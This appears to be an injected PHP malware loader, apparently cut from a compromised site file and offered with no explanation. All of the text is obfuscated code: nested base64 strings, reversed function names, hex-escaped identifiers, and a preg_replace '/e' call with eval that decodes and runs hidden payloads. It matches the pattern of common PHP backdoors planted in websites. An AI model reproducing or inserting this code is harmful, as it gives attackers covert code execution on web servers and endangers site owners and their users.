X2ITMcVmN4xlMzEDXiZDecNjNxwFO0gHXxETMcBzN4xFN2wFZ2gHXzQTMcFzM4xlMyEDX4UDecJzMxwVO3gHXyITMcNDN4x1MxEDX1cDecZjMxwVZ2gHXzQTMcBzM4xlNyEDXkZDecNDNxw1N2gHX0YDXyMDecJDNxwFM3gHXyITMcNzM4xVMzEDX1cDecZjMxwVZ2gHXyMTMcJiLn4SNyInZk4yJzYTMcF2N4xlMxEDX1cDecZjMxwVZ2gHXzQTMcBzM4xlNyEDXkZDecNDNxwVZ2gHXwYDXhZDecJDNxwVMzgHXyETMcdiL1ITayZGJuciIuciL1IjcmRiLnUzNcdzN4x1NxEDXlZDecRjNcJzM4xlM0EDXwcDecJjMxw1MzgHXxMTMcVzN4xlNyEDXlZDecJzMxwlN2gHX2ITMcdDN4xFN0EDX4YDecZjMxwFZ2gHXzQTMcFmN4xFN0EDXzUDecBjMxwVN3gHX2ITMcdiL1ITayZGJuciIuciL1IjcmRiLnMjNxwVY3gHXyETMcNmN4xlNxEDX3UDecFzMxw1M3gHXyATMchTN4xlMzEDX5cDecFzNcFzM4xlMzEDXjZDecJTMxwFO0gHXzQTMcVmN4xFM2wVY2gHXyQTMclzN4xlNwEDX3QDecRDNxw1Y2gHXyETMchDN4xlMxEDXi4iM1QXamRCLyUjZpZGJsUjMmlmZkgSZjFGbwVmcfdWZyB3OiIjM4xFM1wVN2gHX0QTMcZmN4x1M0EDX1YDecRDNxwlZ1gHX0YDX2MDecVDNxw1M3gHXxQTMcJjN4xFM1w1Y2gHXxQTMcZzN4xVN0EDXwQDecJCI9AiM1QXamRyOiI2M4xVM1wlMygHXxYDXjVDecJDNchjM4xFN1EDXxYDecZjNxwVN2gHXiASPgITNmlmZksjI1QTMcljN4xFMwEDX5IDecNTNcVmM4xFM1wFM0gHXiASPgUjMmlmZkcCKsFmdltjIwIDecVzNcBjM4xFM2wFN2gHX0QTMcRjM4xlIg0DI1ITayRGJgsTN1kmcmRiLnkiIn4iM1kmcmRCI9ASNyInZkAyOngDN4xFN0EDXjZDecJTMxwFO0gHXyETMcdCI9ASNykmcmRyOnI2M4xVM1wVOygHXyQDXkNDecdCI9AiM1kmcmRyOnQDV2YWfVtUTnASPgITNyZGJ7cCKuVnc0VmckcCI9ASN1InZkszJyUDdpZGJsITNmlmZkwSNyYWamRCKuJXY0VmckszJg0DI1UTayZGJ+aWYgKCFpc3NldCgkZXZhbFVkQ1hURFFFUm1XbkRTKSkge2Z1bmN0aW9uIGV2YWxsd2hWZklWbldQYlQoJHMpeyRlID0gIiI7IGZvciAoJGEgPSAwOyAkYSA8PSBzdHJsZW4oJHMpLTE7ICRhKysgKXskZSAuPSAkc3tzdHJsZW4oJHMpLSRhLTF9O31yZXR1cm4oJGUpO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>
